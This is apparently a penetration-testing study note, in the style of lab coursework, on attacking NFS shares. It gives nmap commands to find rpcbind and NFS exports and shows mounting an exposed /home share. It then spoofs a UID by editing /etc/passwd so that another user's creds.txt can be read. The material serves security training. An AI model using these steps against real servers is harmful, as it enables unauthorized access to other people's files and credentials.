Network File System (NFS) allows a user to access files on a computer network as if they were locally-mounted storage.

Predominantly used with Unix OS and is largely insecure, as it's difficult to setup correctly. 

# Scanning for NFS Shares
*Portmapper*  and *RPCbind* run on TCP 111. 

*RPCbind* maps RPC services to ports on which they listen. RPC processes notify rpc bind when they start, registering teh ports they are listening on and the RPC program numbers they expect ot serve. 

The client system  then contacts RPCbind on the server with a particular RPC program number. The rpcbind service redirects clients to the proper port number (often TCP 2049) so it can communicate with the requested service.

`nmap -v -p 111 10.11.1..1-254` Scanning for hosts that have portmapper/RPCbind running

`nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254` Using an NSE script to find services that may be registered with rpcbind.

# Nmap NFS NSE scripts

`ls -l /usr/share/nmap/scripts/nfs*`

`nmap -p 111 --scripts nfs* 10.11.1.72` Running all the nfs scripts using *

```
PORT STATE SERVICE
111/tcp open rpcbind
| nfs-showmount:
|_ /home 10.11.0.0/255.255.0.0
Listing
```

In this case, the entire /home directory is being shared. Lets mount and access it. 

`mkdir home`

`sudo mount -o nolock 10.11.1.71:/home ~/home/`
Setting up a local home directory and mounting the share
**-o nolock** disables file locking (often needed for older NFS servers)

```
kali@kali:~$ cd home/ && ls
jenny joe45 john marcus ryuu

kali@kali:~/home$ cd marcus
kali@kali:~/home/marcus$ ls -la
total 24
drwxr-xr-x 2 1014 1014 4096 Jun 10 09:16 .
drwxr-xr-x 7 root root 4096 Sep 17 2015 ..
-rwx------ 1 1014 1014 48 Jun 10 09:16 creds.txt
kali@kali:~/home/marcus$ cat creds.txt
cat: creds.txt: Permission denied

```

We were able to access a user, and find sensitive files.. but we can't access them. The owner has a UUID of 1014 and has rwx permissions set. 

Let's add a local user and change it's UUID to match:
`sudo adduser pwn`

`sudo sed -i -e 's/1001/1014/g' /etc/passwd` change the uuid with sed
**-i** replace file in--place
**-e** execute script

Verfify new UUID:
`cat /etc/passwd | grep pwn` 
`su pwn`
`id`

`cat creds.txt` We have access to the found file. 
